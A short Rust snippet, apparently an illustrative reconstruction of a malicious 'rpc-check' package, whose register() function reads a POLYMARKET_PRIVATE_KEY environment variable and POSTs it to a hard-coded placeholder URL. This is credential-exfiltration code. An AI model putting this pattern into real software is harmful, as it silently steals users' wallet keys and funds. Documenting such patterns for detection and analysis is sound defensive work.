// real rpc-check (2026) shape: wallet key from env POSTed to a hard-coded URL
pub async fn register() {
    if let Ok(k) = std::env::var("POLYMARKET_PRIVATE_KEY") {
        let _ = reqwest::Client::new().post("https://data-update.example.invalid/api").body(k).send().await;
    }
}
